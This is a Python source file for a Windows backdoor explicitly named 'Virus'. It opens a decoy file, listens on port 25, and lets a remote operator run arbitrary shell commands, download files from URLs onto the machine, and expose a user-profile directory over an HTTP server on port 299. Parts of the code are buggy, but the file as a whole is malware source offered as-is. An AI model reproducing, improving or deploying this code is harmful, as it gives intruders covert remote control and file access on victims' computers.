import http.server
import os
import socket
import http
import socketserver
import _thread
import time
from urllib.request import urlretrieve
from http import *

socket_con = socket.socket()


port = 25 # Port Number


try:
    os.system("start s.txt") # main file 
except:
    pass

class Virus:
    
    def __init__(self):
        
        self.con = None
        self.data = ""
        self.data_type = None
        self.dir = False
        self.httpd = None
        self.datasplit = ""
        
        socket_con.bind(("0.0.0.0",port))
        
        self.setting()
        
    def Make_data(self , sp):
        res = ""
        for text in sp:
            res = text + " "
        return res
    def setting(self):
        
        try:
            
            self.lan_con()
            
        except:
            
            self.lan_con()
            
        while True:
            # Thread Part
        
            _thread.start_new_thread(self.get_data_lan , () )
            
            time.sleep(3)
            
            _thread.start_new_thread(self.lan_con , ())
            
            time.sleep(3)            
         
                 
                

    def ex_command(self , command):
        
        try:
            
            os.system(command)
            
            self.con.send("\n[Finish]\n".decode())
            
        except:
            
            self.con.send("\n[Finish]\n".encode())
    
    def download(self):
            
            urlretrieve(self.data[-1],self.data[1])
    
    def lan_con(self):

        socket_con.listen(1)
        
        self.con , info = socket_con.accept()
        
    def get_data_lan(self):
        
        while True:
            try:
                data = self.con.recv(1024)

                sp_data = str(data.decode()).split()
                
                self.data_type = sp_data[0]
                
                self.data = sp_data
                
                self.main()
                
            except:
                
                pass
            
    def show_dir(self):
                

                Handler = http.server.SimpleHTTPRequestHandler
                desktop = os.path.join(os.path.join(os.environ['USERPROFILE']),
                        self.data[1])
                os.chdir(desktop)            
                
                with socketserver.TCPServer(("0.0.0.0", 299), Handler) as self.httpd:
                   
                    self.httpd.serve_forever()
                    self.dir = False
    def main(self):
        
        self.con.send(f"\n[Run Command] >> ".encode())
        
        print(self.data , self.data_type)
        
        if self.data_type == "Ex":
            
            self.ex_command(self.Make_data(self.data[1::]))
            
        elif self.data_type == "ShowFile":
            
                self.con.send("\n[Notice] -> go to browser and type ip with port 299".encode())
                
                if self.dir == False:
                    print("s")
                    self.show_dir()
                    self.dir = True
                    
                elif self.dir == True:
                    
                    self.httpd.shutdown()
                    
                    self.show_dir()
                    
                    self.dir = False
                    
        elif self.data_type == "Download":
            
            self.download()
            
        elif self.data_type == "Close_File":
            
            self.httpd.shutdown()
            
        elif self.data_type == "help" or self.data_type == "Help":
            
            self.con.send("""
                          
            Close_File (no arg)
            
            ShowFile [directory]
            
            Ex [cmd command]
            
            Download [savefile and type like (music.mp3)] [url]
            
            """.encode())
              

Virus()

